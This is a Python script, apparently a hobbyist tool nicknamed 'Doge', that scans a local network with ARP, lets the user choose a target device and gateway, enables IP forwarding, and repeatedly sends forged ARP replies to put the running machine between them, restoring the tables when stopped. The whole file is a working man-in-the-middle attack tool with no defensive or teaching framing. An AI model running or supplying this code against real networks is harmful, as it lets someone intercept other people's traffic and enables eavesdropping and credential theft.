import scapy.all as scapy
import netifaces
from netaddr import IPAddress
import os
import socket
import sys
import threading
from time import sleep
from tabulate import tabulate
import inquirer

def adapter_selection():

    adapter_list = scapy.get_if_list()
    adapter_list.append("Quit")
    adapter_choices = [inquirer.List('adapter', message="Choose a Network Adapter to Spoof from", choices=adapter_list )]
    adapter = inquirer.prompt(adapter_choices)['adapter']

    if adapter == "Quit":
        os.system("clear")
        exit(0)


    print(f"Using {adapter}...")
    print()

    return adapter

def get_adapter_info(adapter):
    
    ip = scapy.get_if_addr(adapter)
    mac = scapy.get_if_hwaddr(adapter)

    try:
        netmask = netifaces.ifaddresses(adapter)[netifaces.AF_INET][0]['netmask']
    except KeyError:
        sys.exit("This adapter is not connected to a network. Unable to obtain Netmask. Exiting...")

    ip_bytes = socket.inet_aton(ip)

    mask_bytes = socket.inet_aton(netmask)
    network_address_bytes = bytes([ip_bytes[i] & mask_bytes[i] for i in range(4)])
    network_address = socket.inet_ntoa(network_address_bytes)
    
    scan_range = f"{network_address}/{IPAddress(netmask).netmask_bits()}"
    
    print(f"Your IP Address: {ip}")
    print(f"Your MAC Address: {mac}")
    print(f"Your Netmask: {netmask}")
    print()


    return ip,mac,netmask,scan_range

def get_devices(scan_range):

    input("Hit enter to start scanning the network...")
    print()

    netmask_bits = int(scan_range.split('/')[1])

    if netmask_bits < 16:
        print("The network is quite big. This might take a while...")

    print(f"Scanning network {scan_range} for devices")

    broadcast_mac = "ff:ff:ff:ff:ff:ff"
    request = scapy.Ether(dst=broadcast_mac) / scapy.ARP(pdst=scan_range)

    ans, _ = scapy.srp(request, timeout=1, retry=1, verbose=0)
    result = {'IP':[], 'MAC':[]}

    for _,received in ans:
        result['IP'].append(received.psrc)
        result['MAC'].append(received.hwsrc)
    
    print(tabulate(result, headers="keys", tablefmt="pretty"))
    print()

    return result

def get_targets(device_list):

    ip_list = device_list['IP']
    mac_list = device_list['MAC']

    target_list = [ip for ip in ip_list] + ['Quit']
    target_choices = [inquirer.List('target', message="Select the Target Device IP", choices= target_list)]
    target = inquirer.prompt(target_choices)['target']

    if target == 'Quit':
        os.system("clear")
        exit(0)
    
    idx = ip_list.index(target)
    target = {'IP': ip_list[idx], 'MAC': mac_list[idx]}
    
    ip_list = list(filter(lambda x: x!= target['IP'], ip_list))
    mac_list = list(filter(lambda x: x!= target['MAC'], mac_list))

    gateway_list = [ip for ip in ip_list] + ['Quit']
    gateway_choices = [inquirer.List('gateway', message="Select the Gateway IP", choices=gateway_list)]
    gateway = inquirer.prompt(gateway_choices)['gateway']
    
    if gateway == "Quit":
        os.system("clear")
        exit(0)
    
    idx = ip_list.index(gateway)
    gateway = {'IP': ip_list[idx], 'MAC': mac_list[idx]}
    
    print(f"Target: {target['IP']}")
    print(f"Gateway: {gateway['IP']}")
    print()
    print(f"Ready to perform ARP Poisoning between {target['IP']} and {gateway['IP']}")

    return target, gateway
    
def arp_poison(target1, target2):
    print("Enabling IP-Forwarding, So Doge is Inconspicuous...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    t = threading.currentThread()

    while not getattr(t, 'stop', False):
        scapy.send(scapy.ARP(op=2, pdst=target1['IP'], hwdst=target1['MAC'], psrc=target2['IP']), verbose=False)
        scapy.send(scapy.ARP(op=2, pdst=target2['IP'], hwdst=target2['MAC'], psrc=target1['IP']), verbose=False)
        sleep(2)

    print("Stopping poisioning...")

    print("Administering the Anti-Doge...")
    scapy.send(scapy.ARP(op=2, pdst=target1['IP'], hwdst=target1['MAC'], psrc=target2['IP'], hwsrc=target2['MAC']), verbose=False)
    scapy.send(scapy.ARP(op=2, pdst=target2['IP'], hwdst=target2['MAC'], psrc=target1['IP'], hwsrc=target1['MAC']), verbose=False) 

    print("Doge has got everything he needs. Disabling IP-Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")